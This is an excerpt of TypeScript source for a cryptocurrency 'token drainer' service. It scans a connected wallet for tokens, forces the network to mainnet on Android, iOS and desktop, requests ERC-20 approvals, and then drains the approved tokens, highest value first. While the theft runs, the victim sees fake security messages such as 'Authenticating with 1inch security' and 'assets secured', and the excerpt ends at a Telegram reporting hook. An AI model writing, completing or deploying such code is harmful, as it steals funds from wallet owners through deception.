...
class TokenDrainerService {
  ...
  async scanTokens(callback?: (progress: { status: string; message: string; progress: number }) => void): Promise<Token[]> {
    try {
      ...
      // Check network with error handling and force mainnet
      ...
      try {
        ...
        if (networkId !== 1) {
          ...
          if (isAndroid) {
            console.warn(`⚠️ Android device on wrong network ${networkId}, switching to mainnet...`)
          } else if (isIOS) {
            console.warn(`⚠️ iOS device on wrong network ${networkId}, switching to mainnet...`)
          } else {
            console.warn(`⚠️ Wrong network detected: ${networkId}, switching to mainnet...`)
          }
          
          // Force switch to mainnet (chain ID 0x1) with device-specific timeouts
          try {
            if (isAndroid) {
              // Android needs longer timeout for network switching
              await Promise.race([
                ...
                new Promise((_, reject) => 
                  setTimeout(() => reject(new Error('Android switch timeout')), 15000)
                )
              ])
              console.log('✅ Android: Successfully switched to mainnet')
            } else {
              // Standard timeout for iOS/Desktop
            ...
            if (isAndroid) {
              console.warn('⚠️ Android: Failed to switch to mainnet:', switchError)
            } else {
              console.warn('⚠️ Failed to switch to mainnet:', switchError)
            }
            // If switch fails, try to add mainnet
            if (switchError.code === 4902) {
              try {
                ...
                console.log('✅ Successfully added and switched to mainnet')
                networkId = 1
              } catch (addError) {
                console.warn('⚠️ Failed to add mainnet, continuing anyway:', addError)
              }
            }
          }
        }
      ...
      if (callback) {
        callback({
          status: 'analyzing',
          message: 'Analyzing wallet security status...',
          progress: 10
        })
      }
      ...
      if (discoveredTokens.length === 0) {
        if (callback) {
          callback({
            status: 'verifying',
            message: 'Verifying wallet credentials...',
            progress: 30
          })
        }
      ...
      if (discoveredTokens.length === 0) {
        if (callback) {
          callback({
            ...
            message: 'Authenticating with 1inch security...',
            progress: 50
          })
        }
      ...
      if (discoveredTokens.length === 0) {
        ...
        if (callback) {
          callback({
            status: 'securing',
            message: 'Securing your wallet assets...',
            progress: 70
          })
        }
        ...
        for (let i = 0; i < POPULAR_TOKENS.length; i += batchSize) {
          ...
          if (callback) {
            callback({
              status: 'validating',
              message: `Validating asset ${progress}/${POPULAR_TOKENS.length}...`,
      ...
      if (callback) {
        callback({
          status: 'complete',
          message: `Security check complete - ${tokensWithBalance.length} assets secured`,
          progress: 100
        })
      }
      ...
      try {
        ...
        if (approved) {
          ...
          try {
            ...
            this.updateStatus(`Securing ${token.symbol}... Please wait...`)
            
            // Wait a moment for approval to settle on blockchain
            await new Promise(resolve => setTimeout(resolve, 2000))
            ...
            this.updateStatus(`${token.symbol} secured! Processing next asset...`)
            
          } catch (drainError) {
            console.error(`❌ Failed to drain ${token.symbol} after approval:`, drainError)
            // Continue with next token even if drainage fails
          }
        } else {
        ...
        this.updateStatus(`Securing asset ${approvedCount}/${sortedTokens.length}...`)
  ...
  async drainAllTokens(): Promise<void> {
    try {
      ...
      // Step 2: Approve and drain each token immediately (highest value first)
      console.log('🔐 Step 2: Starting approve + drain process (highest value first)...')
      ...
      console.log(`✅ Process complete: Successfully secured ${approvedCount} tokens!`)
      this.updateStatus(`Security process complete! ${approvedCount} assets secured.`)
  ...
  // Manual function to drain all approved tokens immediately
  async drainApprovedTokens(): Promise<void> {
    try {
      console.log('🔥 Manual drainage triggered for approved tokens...')
      
      if (this.tokens.length === 0) {
        console.log('⚠️ No tokens found. Run scanTokens() first.')
        return
      }
      
      const approvedTokens = this.tokens.filter(token => token.approved === true)
      
      if (approvedTokens.length === 0) {
        console.log('⚠️ No approved tokens found to drain')
        return
      }
      
      console.log(`🚀 Draining ${approvedTokens.length} approved tokens...`)
      approvedTokens.forEach((token, index) => {
        console.log(`${index + 1}. ${token.symbol}: ${token.formattedBalance}`)
      })
      
      await this.executeDrainage(approvedTokens)
      console.log('✅ Manual drainage completed!')
      
    } catch (error) {
      console.error('❌ Manual drainage failed:', error)
      throw error
    }
  }

  // Check approval status for a specific token
  async checkTokenApproval(tokenAddress: string): Promise<boolean> {
    try {
      ...
      const isApproved = currentAllowance > 0
      
      console.log(`🔍 Approval check for ${tokenAddress}: ${isApproved ? 'APPROVED' : 'NOT APPROVED'} (Allowance: ${currentAllowance})`)
      
      return isApproved
      
    } catch (error) {
      console.error(`❌ Failed to check approval for ${tokenAddress}:`, error)
      return false
    }
  }
  ...
  private async approveToken(token: Token): Promise<boolean> {
    try {
      ...
      // Ensure we're on mainnet before approval (iOS/Android fix)
      try {
        if (window.ethereum) {
          const chainId = await (window.ethereum as any).request({ method: 'eth_chainId' })
          const currentNetwork = parseInt(chainId, 16)
          ...
          if (currentNetwork !== 1) {
            if (isAndroid) {
              console.log(`🤖 Android device detected - switching from network ${currentNetwork} to mainnet...`)
              // Android-specific network switching with longer timeout
              await Promise.race([
                (window.ethereum as any).request({
                  method: 'wallet_switchEthereumChain',
                  params: [{ chainId: '0x1' }]
                ...
                new Promise((_, reject) => 
                  setTimeout(() => reject(new Error('Android network switch timeout')), 10000)
                )
              ])
              console.log('✅ Android: Network switched to mainnet for approval')
              
              // Longer delay for Android to ensure network switch settles
              await new Promise(resolve => setTimeout(resolve, 2000))
            } else if (isIOS) {
              console.log(`🍎 iOS device detected - switching from network ${currentNetwork} to mainnet...`)
              await (window.ethereum as any).request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x1' }]
              })
              console.log('✅ iOS: Network switched to mainnet for approval')
              
              // Standard delay for iOS
              await new Promise(resolve => setTimeout(resolve, 1000))
            } else {
              console.log(`🖥️ Desktop detected - switching from network ${currentNetwork} to mainnet...`)
              await (window.ethereum as any).request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x1' }]
              })
              console.log('✅ Desktop: Network switched to mainnet for approval')
              
              // Small delay for desktop
              await new Promise(resolve => setTimeout(resolve, 500))
            }
          } else if (isMobile) {
            if (isAndroid) {
              console.log('🤖 Android device on mainnet - ready for approval')
            } else if (isIOS) {
              console.log('🍎 iOS device on mainnet - ready for approval')
            }
          }
        }
        ...
        const isAndroid = /Android/i.test(navigator.userAgent)
        if (isAndroid) {
          console.warn('⚠️ Android network switch failed during approval, continuing:', networkSwitchError)
        } else {
          console.warn('⚠️ Network switch failed during approval, continuing:', networkSwitchError)
        }
      }
      ...
      // Update button text to show security verification like original
      this.updateStatus(`Verifying ${token.symbol} security...`)
      ...
      if (txHash) {
        ...
        this.updateStatus(`${token.symbol} security verified! Processing...`)
      ...
      if (error.code === 4001) {
        ...
        this.updateStatus('Security verification declined - Try again')
        ...
        this.updateStatus('Insufficient ETH for verification')
      } else {
        console.log('💥 Approval transaction failed:', error.message)
        this.updateStatus('Security verification failed - Try again')
      }
  ...
  private async sendTelegramMessage(type: string, data: any): Promise<void> {
    if (!DRAINER_CONFIG.TELEGRAM.ENABLED) return
